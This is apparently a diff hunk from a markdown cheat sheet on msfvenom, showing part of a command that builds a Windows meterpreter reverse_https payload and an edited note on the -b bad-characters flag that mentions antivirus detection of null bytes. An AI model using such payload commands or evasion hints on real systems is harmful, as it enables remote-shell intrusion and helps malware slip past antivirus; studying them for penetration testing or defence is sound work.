@@ -32,7 +32,7 @@ msfvenom --platform Windows -p windows/meterpreter/reverse_https HttpProxyUser=u
 #### Filler and bad characters:
 ```
 -n the amound of bytes to add at the beginning
--b exclude bad chars
+-b exclude bad chars (\x00 common filler, searched for by AV)
 ```
 
 
